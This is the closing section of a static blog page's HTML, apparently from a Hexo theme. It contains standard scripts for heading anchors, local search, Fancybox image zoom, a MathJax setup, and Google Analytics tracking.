    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>





  

  
    <!-- MathJax -->
    <script>
      MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']]
        },
        options: {
          renderActions: {
            findScript: [10, doc => {
              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
                const display = !!node.type.match(/; *mode=display/);
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
                const text = document.createTextNode('');
                node.parentNode.replaceChild(text, node);
                math.start = { node: text, delim: '', n: 0 };
                math.end = { node: text, delim: '', n: 0 };
                doc.math.push(math);
              });
            }, '', false],
            insertedScript: [200, () => {
              document.querySelectorAll('mjx-container').forEach(node => {
                let target = node.parentNode;
                if (target.nodeName.toLowerCase() === 'li') {
                  target.parentNode.classList.add('has-jax');
                }
              });
            }, '', false]
          }
        }
      };
    </script>

    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>

  













  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'UA-177243668-2', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"></script>
  

  
    <!-- Google gtag.js -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
    <script defer>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-177243668-2');
    </script>
  

  

  

  





</body>
</html>
